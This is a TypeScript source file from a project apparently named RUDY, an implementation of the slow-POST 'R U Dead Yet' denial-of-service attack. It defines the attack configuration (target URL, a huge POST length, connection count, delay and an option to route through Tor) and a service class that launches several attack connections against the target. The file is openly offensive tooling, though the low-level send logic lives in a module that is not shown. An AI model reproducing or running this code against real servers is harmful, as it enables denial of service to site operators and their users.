//
//  rudy.service.ts
//  RUDY
//
//  Created by Sahil Chaddha on 08/05/2018.
//  Copyright © 2018 RUDY. All rights reserved.
//

import logger, { LogLevel } from "../utils/logger"
import * as Error from "../models/error.model"
import { HTTPMethod } from "./network.service"
import AttackService, { IAttackServiceResponsePayload } from "./attack.service"
import IService from "./service"
/* tslint:disable array-type object-literal-sort-keys */

export interface IRudyConfig {
    target: string
    method: HTTPMethod
    packet_len: number
    maxConnections?: number
    delay: number
    shouldUseTor: boolean
}

const defaultConfig: IRudyConfig = {
    target: "http://localhost:80/",
    method: HTTPMethod.POST,
    packet_len: 1000000,
    maxConnections: 5,
    delay: 2,
    shouldUseTor: false,
}

class RudyService implements IService {
    public serviceName: string = "Rudy_Service"
    private config: IRudyConfig
    private attacks: AttackService[]
    constructor(config: IRudyConfig) {
        this.config = defaultConfig
        this.mapConfig(config)
        this.attacks = []
    }

    public attack() {
        logger.info({message: "Starting Attack at " + this.config.target, category: this.serviceName})
        for (var i = 0; i < this.config.maxConnections; i++) {
            const attackService = new AttackService(this.config)
            attackService.attack()
            this.attacks.push(attackService)
        }
    }

    private mapConfig(config: IRudyConfig) {
        Object.keys(config).forEach((key, index) => {
            if (config[key] != null) {
                this.config[key] = config[key]
            }
        })

        logger.verbose({message: "Updated Configuration with new Settings.",
                        category: this.serviceName, data: this.config})
    }
}

export default RudyService
